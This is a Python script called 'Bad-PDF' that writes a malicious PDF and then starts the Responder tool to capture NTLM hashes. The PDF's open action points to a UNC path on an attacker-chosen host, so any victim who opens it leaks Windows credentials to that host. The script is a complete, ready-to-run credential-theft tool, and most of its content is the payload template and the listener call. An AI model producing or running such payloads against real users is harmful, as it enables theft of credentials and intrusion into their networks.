#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import io
import os
import subprocess
r""" 
====================================================================================================================
        ______                 __       _______  ______   ________  
        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|
        
        This is tool use technique disclosed by the check point team to steal the NTLM hash using malicious PDF file.
        Author : Deepu TV ; Alias DeepZec
====================================================================================================================        
"""

responder = '/usr/sbin/responder'
interface = 'eth0'
RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'


def create_malpdf(filename, host):
    print("[*] Starting Process.. [*]")
    pdf_content = f'''
%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F ({host}test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
'''
    with io.FileIO(filename, "w") as file:
        file.write(pdf_content.encode())


if __name__ == "__main__":

    try:
        print(r"""
      
        ______                 __       _______  ______   ________  
        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|

        Author : Deepu TV ; Alias DeepZec 

        =============================================================
        """)


        if os.path.isfile(responder):
            print(f"Responder detected: {responder}")

        else:
            print("Responder not found..")
            responder = input("Please enter responder path (Default /usr/sbin/responder): \n")

        host = input("Please enter Bad-PDF host IP: \n")
        filename = input("Please enter output file name: \n")
        interface = input("Please enter the interface name to listen(Default eth0): \n")
        create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')

        print(f"Bad PDF {filename} created")

        subprocess.Popen(responder + ' -I ' + interface + ' -wF', shell=True).wait()

    except KeyboardInterrupt:
        exit(0)
